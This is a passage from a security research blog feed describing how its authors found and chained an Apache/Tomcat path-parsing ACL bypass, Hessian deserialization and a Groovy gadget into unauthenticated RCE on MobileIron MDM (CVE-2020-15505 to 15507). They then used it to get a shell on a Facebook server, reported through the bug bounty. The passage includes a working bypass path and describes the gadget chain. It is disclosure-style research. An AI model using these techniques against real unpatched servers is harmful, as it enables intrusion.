&lt;p&gt;但幸運的是，我們依然可以透過 JNDI 的 Naming Reference 到本機既有的 Class Factory 上! 透過類似 &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt; 的概念，尋找本機 ClassPath 中可利用的類別去做更進一步的利用，詳細的手法可參考由 &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; 在 2019 年年初所發表的 &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt;，裡面詳細敘述了如何透過 Tomcat 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; 去載入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; 達成任意程式碼執行!&lt;/p&gt;

&lt;p&gt;這條路看似通暢，但實際上卻差那麼一點，由於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; 在 Tomcat 8 後才被引入，因此上面的繞過方式只能在 Tomcat 版本大於 8 後的某個版本才能成功，而我們的目標則是 Tomcat 7.x，因此得為 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; 尋找一個新的利用鏈! 而經過搜尋，發現在 &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; 的&lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;文章&lt;/a&gt;中所提到:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;除了 javax.el.ELProcessor，当然也还有很多其他的类符合条件可以作为 beanClass 注入到 BeanFactory 中实现利用。举个例子，如果目标机器 classpath 中有 groovy 的库，则可以结合之前 Orange 师傅发过的 &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins 的漏洞实现利用&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;目標的 ClassPath 上剛好有 Groovy 存在! 於是我們又讓 Meta Programming 偉大了一次 :D&lt;/p&gt;

&lt;p&gt;然而事實上，目標伺服器上 Groovy 版本為 1.5.6，是一個距今十年前老舊到不支援 Meta Programming 的版本，所以我們最後還是基於 Groovy 的程式碼，重新尋找了一個在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; 上的利用鏈! 詳細的利用鏈可參考我送給 &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass&quot;&gt;JNDI-Injection-Bypass&lt;/a&gt; 的這個 &lt;a href=&quot;https://github.com/welk1n/JNDI-Injection-Bypass/pull/1&quot;&gt;Pull Request&lt;/a&gt;!&lt;/p&gt;

&lt;h2 id=&quot;攻擊-facebook&quot;&gt;攻擊 Facebook&lt;/h2&gt;

&lt;p&gt;現在我們已經有了一個基於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDI&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; + &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GroovyShell&lt;/code&gt; 的完美遠端程式碼執行漏洞，接下來就開始攻擊 Facebook 吧! 從前文提到，我們在 2016 年時就已知 Facebook 使用 MobileIron 當作他們的 MDM 解決方案，雖然現在再檢查一次發現首頁直接變成 403 Forbidden 了，不過幸運的是 Web Service 層並無阻擋!
s
&lt;img src=&quot;/assets/img/blog/20200912/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;萬事俱備，只欠東風! 正當要攻擊 Facebook 的前幾天，我們突然想到，從上次&lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;進入 Facebook 伺服器&lt;/a&gt;的經驗，由於安全上的考量，Facebook 似乎會禁止所有對外部非法的連線，這點對我們 JNDI 注入攻擊有著至關重要的影響! 首先，JNDI 注入的核心就是透過受害者連線至攻擊者控制的惡意伺服器，並接收回傳的惡意 Naming Reference 後所導致的一系列利用，但現在連最開始的連線到攻擊者的惡意伺服器都無法，更別談後續的利用。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;自此，我們關於 JNDI 注入的路已全被封殺，只能回到 Hessian 反序列化重新思考! 而現有的利用鏈皆無法達到遠端程式碼執行，所以我們勢必得拋棄 JNDI 注入，尋找一個新的利用鏈!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;為了尋找新的利用鏈，必須先深入理解已存在利用鏈的原理及成因，在重讀 &lt;a href=&quot;https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt; 的論文後，我對其中一句話感到了好奇:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Cannot restore Groovy’s MethodClosure as readResolve() is called which throws an exception.&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;哦，為什麼作者要特地補上這句話呢? 我開始有個猜想:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;作者評估過把 Groovy 當成利用鏈的可行性，雖然被限制住了，但一定覺得有機會才會寫進論文中!&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;從這個猜想出發，雖然 Groovy 的利用鏈被 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readResolve()&lt;/code&gt; 限制住了，但剛好我們目標版本的 Groovy 很舊，說不定尚未把這個限制加入程式庫!&lt;/p&gt;

&lt;p&gt;我們比較了一下 Groovy-1.5.6 與最新版本位於 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;groovy/runtime/MethodClosure.java&lt;/code&gt; 中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readSolve()&lt;/code&gt; 實現:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;diff&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1_5&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_6&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3_0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MethodClosure&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;java&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readResolve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;ALLOW_RESOLVE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;             &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;         &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;UnsupportedOperationException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;可以看到的確在舊版是沒有 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ALLOW_RESOLVE&lt;/code&gt; 限制的，而後來經過考古後也發現，這個限制其實 Groovy 自己為了因應 2015 年所出現 Java 反序列化漏洞的減緩措施，因此也被分配了 &lt;a href=&quot;https://groovy-lang.org/security.html&quot;&gt;CVE-2015-3253&lt;/a&gt; 這個漏洞編號! 由於 Groovy 只是一個只在內部使用、不會對外的小配角，因此在沒有特別需求下開發者也不會特地去更新它，因此成為了我們攻擊鏈的一環! 這也再一次驗證了「任何看似舉無輕重的小元件，都有可能成為你被攻擊的主因」!&lt;/p&gt;

&lt;p&gt;最後，當然! 我們成功的取得在 Facebook 伺服器上的 Shell，以下是影片:&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/hGTLIIOb14A&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;漏洞通報與修復&quot;&gt;漏洞通報與修復&lt;/h2&gt;

&lt;p&gt;我們約在三月時完成整個漏洞研究，並在 4/3 日將研究成果寫成報告，透過 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security@mobileiron.com&lt;/code&gt; 回報給 MobileIron! 官方收到後著手開始修復，在 6/15 釋出修補程式並記錄了三個 CVE 編號，詳細的修復方式請參閱 &lt;a href=&quot;https://www.mobileiron.com/en/blog/mobileiron-security-updates-available&quot;&gt;MobileIron 官方網站&lt;/a&gt;!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2020-15505 - Remote Code Execution&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 - Authentication Bypass&lt;/li&gt;
  &lt;li&gt;CVE-2020-15507 - Arbitrary File Reading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;當官方釋出修補程式後，我們也開始監控世界上所有有使用 MobileIron 企業的修復狀況，這裡只單純檢查靜態檔案的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt; Header，結果僅供參考不完全代表實際情況(Unknown 代表未開 443/8443 無法利用):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;與此同時，我們也持續監控著 Facebook，並在 15 天確認都未修補後於 7/2 日成功進入 Facebook 伺服器後回報 Facebook Bug Bounty Program!&lt;/p&gt;

&lt;h2 id=&quot;結語&quot;&gt;結語&lt;/h2&gt;

&lt;p&gt;到此，我們已經成功示範了如何尋找一個 MDM 伺服器的漏洞! 從繞過 Java 語言層級的保護、網路限制，到寫出攻擊程式並成功的利用在 Bug Bounty Program 上! 因為文長，還有許多來不及分享的故事，這裡僅條列一下供有興趣繼續研究的人參考!&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如何從 MDM 伺服器，控制回員工的手機裝置&lt;/li&gt;
  &lt;li&gt;如何分析 MobileIron 的私有 MI Protocol&lt;/li&gt;
  &lt;li&gt;CVE-2020-15506 本質上其實是一個很有趣的認證繞過漏洞&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;希望這篇文章能夠喚起大眾對於 MDM 攻擊面的注意，以及企業安全的重要性! 感謝收看 :D&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM/</link>
                <guid>https://devco.re/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM</guid>
                <pubDate>Sat, 12 Sep 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM</title>
                <description>&lt;style type=&quot;text/css&quot;&gt;
    table {
        display: block;
        width: 100%;
        overflow: auto;
        word-break: normal;
        word-break: keep-all;
        font-size: smaller;
    }

    table th {
        font-weight: bold
    }

    table th,
    table td {
        padding: 5px 11px;
        border: 1px solid #ddd;
    }

    table tr {
        background-color: #fff;
        border-top: 1px solid #ccc;
    }

    table tr:nth-child(2n) {
        background-color: #f8f8f8;
    }
&lt;/style&gt;

&lt;p&gt;&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2020/09/12/how-I-hacked-Facebook-again-unauthenticated-RCE-on-MobileIron-MDM&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hi, it’s a long time since my last article. This new post is about my research this March, which talks about how I found vulnerabilities on a leading Mobile Device Management product and bypassed several limitations to achieve unauthenticated RCE. All the vulnerabilities have been reported to the vendor and got fixed in June. After that, we kept monitoring large corporations to track the overall fixing progress and then found that Facebook didn’t keep up with the patch for more than 2 weeks, so we dropped a shell on Facebook and reported to their Bug Bounty program!&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;http://hitcon.org/2020&quot;&gt;HITCON 2020&lt;/a&gt;. You can check the slides &lt;a href=&quot;https://hitcon.org/2020/slides/How%20I%20Hacked%20Facebook%20Again!.pdf&quot;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;As a Red Teamer, we are always looking for new paths to infiltrate the corporate network from outside. Just like &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;our research in Black Hat USA last year&lt;/a&gt;, we demonstrated how leading SSL VPNs could be hacked and become your Virtual “Public” Network! SSL VPN is trusted to be secure and considered the only way to your private network. But, what if your trusted appliances are insecure?&lt;/p&gt;

&lt;p&gt;Based on this scenario, we would like to explore new attack surfaces on enterprise security, and we get interested in MDM, so this is the article for that!&lt;/p&gt;

&lt;h2 id=&quot;what-is-mdm&quot;&gt;What is MDM?&lt;/h2&gt;

&lt;p&gt;Mobile Device Management, also known as MDM, is an asset assessment system that makes the employees’ &lt;a href=&quot;https://en.wikipedia.org/wiki/Bring_your_own_device&quot;&gt;BYOD&lt;/a&gt; more manageable for enterprises. It was proposed in 2012 in response to the increasing number of tablets and mobile devices. MDM can guarantee that the devices are running under the corporate policy and in a trusted environment. Enterprise could manage assets, install certificates, deploy applications and even lock/wipe devices remotely to prevent data leakage as well.&lt;/p&gt;

&lt;p&gt;UEM (Unified Endpoint Management) is a newer term relevant to MDM which has a broader definition for managed devices. Following we use MDM to represent similar products!&lt;/p&gt;

&lt;h2 id=&quot;our-target&quot;&gt;Our target&lt;/h2&gt;

&lt;p&gt;MDM, as a centralized system, can manage and control all employees’ devices. It is undoubtedly an ideal asset assessment system for a growing company. Besides, MDM must be reachable publicly to synchronize devices all over the world. A centralized and public-exposing appliance, what could be more appealing to hackers?&lt;/p&gt;

&lt;p&gt;Therefore, we have seen hackers and APT groups abusing MDM these years! Such as phishing victims to make MDM a C&amp;amp;C server of their mobile devices, or even compromising the corporate exposed MDM server to push malicious Trojans to all devices. You can read the report &lt;a href=&quot;https://blogs.cisco.com/security/talos/malicious-mdm-lets-hide-this-app&quot;&gt;Malicious MDM: Let’s Hide This App&lt;/a&gt; by Cisco Talos team and &lt;a href=&quot;https://research.checkpoint.com/2020/mobile-as-attack-vector-using-mdm/&quot;&gt;First seen in the wild - Malware uses Corporate MDM as attack vector&lt;/a&gt; by CheckPoint CPR team for more details!&lt;/p&gt;

&lt;p&gt;From previous cases, we know that MDM is a solid target for hackers, and we would like to do research on it. There are several MDM solutions, even famous companies such as Microsoft, IBM and Apple have their own MDM solution. Which one should we start with?&lt;/p&gt;

&lt;p&gt;We have listed known MDM solutions and scanned corresponding patterns all over the Internet. We found that the most prevalent MDMs are VMware AirWatch and MobileIron!&lt;/p&gt;

&lt;p&gt;So, why did we choose MobileIron as our target? According to their official website, more than 20,000 enterprises chose MobileIron as their MDM solution, and most of our customers are using that as well. We also know Facebook has exposed the MobileIron server &lt;a href=&quot;https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/&quot;&gt;since 2016&lt;/a&gt;. We have analyzed Fortune Global 500 as well, and found more than 15% using and exposing their MobileIron server to the public! Due to above reasons, it became our main target!&lt;/p&gt;

&lt;h2 id=&quot;where-to-start&quot;&gt;Where to Start&lt;/h2&gt;

&lt;p&gt;From &lt;a href=&quot;https://www.cvedetails.com/vulnerability-list/vendor_id-13968/Mobileiron.html&quot;&gt;past vulnerabilities&lt;/a&gt;, we learned there aren’t too many researchers diving into MobileIron. Perhaps the attack vector is still unknown. But we suspect the main reason is that the firmware is too hard to obtain. When researching an appliance, turning a pure BlackBox testing into GrayBox, or WhiteBox testing is vital. We spent lots of time searching for all kinds of information on the Internet, and ended up with an RPM package. This RPM file is supposed to be the developer’s testing package. The file is just sitting on a listable WebRoot and indexed by Google Search.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Anyway, we got a file to research. The released date of the file is in early 2018. It seems a little bit old but still better than nothing!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. We have informed MobileIron and the sensitive files has been removed now.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;finding-vulnerabilities&quot;&gt;Finding Vulnerabilities&lt;/h2&gt;

&lt;p&gt;After a painful time solving the dependency hell, we set the testing package up finally. The component is based on Java and exposed three ports:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;443 - the user enrollment interface&lt;/li&gt;
  &lt;li&gt;8443 - the appliance management interface&lt;/li&gt;
  &lt;li&gt;9997 - the MobileIron device synchronization protocol (MI Protocol)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All opened ports are TLS-encrypted. Apache is in the front of the web part and proxies all connections to backend, a Tomcat with Spring MVC inside.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/2_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Due to the Spring MVC, it’s hard to find traditional vulnerabilities like SQL Injection or XSS from a single view. Therefore, examining the logic and architecture is our goal this time!&lt;/p&gt;

&lt;p&gt;Talking about the vulnerability, the root cause is straightforward. Tomcat exposed a Web Service that deserializes user input with Hessian format. However, this doesn’t mean we can do everything! The main effort of this article is to solve that, so please see the exploitation below.&lt;/p&gt;

&lt;p&gt;Although we know the Web Service deserializes the user input, we can not trigger it. The endpoint is located on both:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;User enrollment interface - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron/mifs/services/&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Management interface - &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://mobileiron:8443/mics/services/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We can only touch the deserialization through the management interface because the user interface blocks the Web Service access. It’s a critical hit for us because most enterprises won’t expose their management interface to the Internet, and a management-only vulnerability is not useful to us so that we have to try harder. :(&lt;/p&gt;

&lt;p&gt;Scrutinizing the architecture, we found Apache blocks our access through Rewrite Rules. It looks good, right?&lt;/p&gt;

&lt;div class=&quot;language-apache highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services/(.*)$ https://%{SERVER_NAME}:8443/mifs/services/$1 [R=307,L]
&lt;span class=&quot;nc&quot;&gt;RewriteRule&lt;/span&gt; ^/mifs/services [F]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;MobileIron relied on Apache Rewrite Rules to block all the access to Web Service. It’s in the front of a reverse-proxy architecture, and the backend is a Java-based web server.&lt;/p&gt;

&lt;p&gt;Have you recalled something?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Yes, the &lt;a href=&quot;https://blog.orange.tw/2018/08/how-i-chained-4-bugs-features-into-rce-on-amazon.html&quot;&gt;Breaking Parser Logic&lt;/a&gt;! It’s the reverse proxy attack surface I &lt;a href=&quot;https://github.com/orangetw/My-CTF-Web-Challenges#blackbox&quot;&gt;proposed in 2015&lt;/a&gt;, and presented at &lt;a href=&quot;https://www.blackhat.com/us-18/briefings.html#breaking-parser-logic-take-your-path-normalization-off-and-pop-0days-out&quot;&gt;Black Hat USA 2018&lt;/a&gt;. This technique leverage the inconsistency between the Apache and Tomcat to bypass the ACL control and reaccess the Web Service. BTW, this excellent technique is also applied to the recently &lt;a href=&quot;https://support.f5.com/csp/article/K52145254&quot;&gt;F5 BIG-IP TMUI RCE vulnerability&lt;/a&gt;!&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://mobileiron/mifs/.;/services/someService
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;exploiting-vulnerabilities&quot;&gt;Exploiting Vulnerabilities&lt;/h2&gt;

&lt;p&gt;OK, now we have access to the deserialization wherever it’s on enrollment interface or management interface. Let’s go back to exploitations!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/mbechler&quot;&gt;Moritz Bechler&lt;/a&gt; has an awesome research which summarized the Hessian deserialization vulnerability on his whitepaper, &lt;a href=&quot;https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf&quot;&gt;Java Unmarshaller Security&lt;/a&gt;. From the &lt;a href=&quot;https://github.com/mbechler/marshalsec&quot;&gt;marshalsec&lt;/a&gt; source code, we learn the Hessian deserialization triggers the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;equals()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcode()&lt;/code&gt; while reconstructing a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HashMap&lt;/code&gt;. It could also trigger the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toString()&lt;/code&gt; through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XString&lt;/code&gt;, and the known exploit gadgets so far are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Apache XBean&lt;/li&gt;
  &lt;li&gt;Caucho Resin&lt;/li&gt;
  &lt;li&gt;Spring AOP&lt;/li&gt;
  &lt;li&gt;ROME EqualsBean/ToStringBean&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In our environment, we could only trigger the Spring AOP gadget chain and get a JNDI Injection.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt; &lt;/th&gt;
      &lt;th&gt;Name&lt;/th&gt;
      &lt;th&gt;Effect&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Apache XBean&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;Caucho Resin&lt;/td&gt;
      &lt;td&gt;JNDI Injection&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;√&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;Spring AOP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;&lt;strong&gt;JNDI Injection&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;x&lt;/td&gt;
      &lt;td&gt;ROME EqualsBean&lt;/td&gt;
      &lt;td&gt;RCE&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Once we have a JNDI Injection, the rest parts of exploitations are easy! We can just leverage &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt;’s work, &lt;a href=&quot;https://www.blackhat.com/us-16/briefings.html#a-journey-from-jndi-ldap-manipulation-to-remote-code-execution-dream-land&quot;&gt;A Journey From JNDI/LDAP to Remote Code Execution Dream Land&lt;/a&gt;, from Black Hat USA 2016 to get the code execution… Is that true?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20200912/3_en.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Since &lt;a href=&quot;https://twitter.com/pwntester&quot;&gt;Alvaro Muñoz&lt;/a&gt; and &lt;a href=&quot;https://twitter.com/olekmirosh&quot;&gt;Oleksandr Mirosh&lt;/a&gt; introduced this on Black Hat, we could say that this technique helps countless security researchers and brings Java deserialization vulnerability into a new era. However, Java finally mitigated the last JNDI/LDAP puzzle in &lt;a href=&quot;https://www.oracle.com/java/technologies/javase/8u181-relnotes.html&quot;&gt;October 2018&lt;/a&gt;. After that, all java version higher than 8u181, 7u191, and 6u201 can no longer get code execution through JNDI remote URL-Class loading. Therefore, if we exploit the Hessian deserialization on the latest MobileIron, we must face this problem!&lt;/p&gt;

&lt;p&gt;Java changed the default value of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.sun.jndi.ldap.object.trustURLCodebase&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;False&lt;/code&gt; to prevent attackers from downloading remote URL-Class to get code executions. But only this has been prohibited. We can still manipulate the JNDI and redirect the Naming Reference to a local Java Class!&lt;/p&gt;

&lt;p&gt;The concept is a little bit similar to &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;Return-Oriented Programming&lt;/a&gt;, utilizing a local existing Java Class to do further exploitations. You can refer to the article &lt;a href=&quot;https://www.veracode.com/blog/research/exploiting-jndi-injections-java&quot;&gt;Exploiting JNDI Injections in Java&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/artsploit&quot;&gt;Michael Stepankin&lt;/a&gt; in early 2019 for details. It describes the attack on POST-JNDI exploitations and how to abuse the Tomcat’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BeanFactory&lt;/code&gt; to populate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELProcessor&lt;/code&gt; gadget to get code execution. Based on this concept, researcher &lt;a href=&quot;https://github.com/welk1n&quot;&gt;Welkin&lt;/a&gt; also provides another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ParseClass&lt;/code&gt; gadget on Groovy. As described in &lt;a href=&quot;https://www.cnblogs.com/Welk1n/p/11066397.html&quot;&gt;his (Chinese) article&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;除了 javax.el.ELProcessor，当然也还有很多其他的类符合条件可以作为 beanClass 注入到 BeanFactory 中实现利用。举个例子，如果目标机器 classpath 中有 groovy 的库，则可以结合之前 Orange 师傅发过的 &lt;a href=&quot;https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html&quot;&gt;Jenkins 的漏洞实现利用&lt;/a&gt;&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;It seems the Meta Programming exploitation in my previous Jenkins research could be used here as well. It makes the Meta Programming great again :D&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

